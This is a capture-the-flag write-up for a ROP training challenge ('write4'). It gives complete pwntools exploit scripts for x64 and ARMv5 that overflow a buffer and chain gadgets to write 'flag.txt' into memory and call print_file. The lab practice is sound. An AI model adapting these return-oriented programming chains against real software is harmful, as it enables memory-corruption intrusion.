## x64
---
- This challenge hinges on using a gadget to store a register into memory, like `mov [rax], rax; ret`
- We have a useful external function called `print_file` which prints a file for us
- Reverse engineering the shared object that houses the `print_file` function, we notice it takes a single argument, filename
- If we can write `flag.txt` to a buffer and pass it to `print_file`, then we win
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./write4"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

offset = 40
bss = 0x601038 # data section also works

# 0x0000000000400628: mov qword ptr [r14], r15; ret;
# 0x0000000000400690: pop r14; pop r15; ret;
stmR14_R15 = 0x400628
popR14_popR15 = 0x400690

rop = ROP(exe)
rop.raw(popR14_popR15)
rop.raw(bss)
rop.raw(b"flag.txt")
rop.raw(stmR14_R15)
rop.raw(rop.rdi.address)
rop.raw(bss)
rop.raw(elf.sym.print_file)

payload = flat({offset: rop.chain()})

context.log_level = "debug"
io = gdb.debug(exe, "b pwnme\nc")
io.sendafter(b"> ", payload)
io.interactive()
```

## ARMv5
---
### solve
```python
#!/usr/bin/env python3

from pwn import *

exe = "./write4_armv5"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

# 0x000105f4: pop {r0, pc};
# 0x000105f0: pop {r3, r4, pc};
# 0x000105ec: str r3, [r4]; pop {r3, r4, pc};
pop_r0pc = p32(0x105f4)
pop_r3r4pc = p32(0x105f0)
str_r3dr4_pop_r3r4pc = p32(0x105ec)

data = 0x21024
string = b"flag.txt"

payload = b""
payload += pop_r3r4pc
for i in range(0, len(string), 4):
    payload += string[i:i+4] # r3
    payload += p32(data + i) #r4
    payload += str_r3dr4_pop_r3r4pc #pc

payload += p32(0) + p32(0) # r3, r4
payload += pop_r0pc
payload += p32(data) # r0
payload += p32(elf.sym.print_file)

offset = 36
payload = flat({offset: payload})

context.log_level = "debug"
io = gdb.debug(exe, "b *0x105c0\nc")
io.sendafter(b"> ", payload)
io.interactive()
```





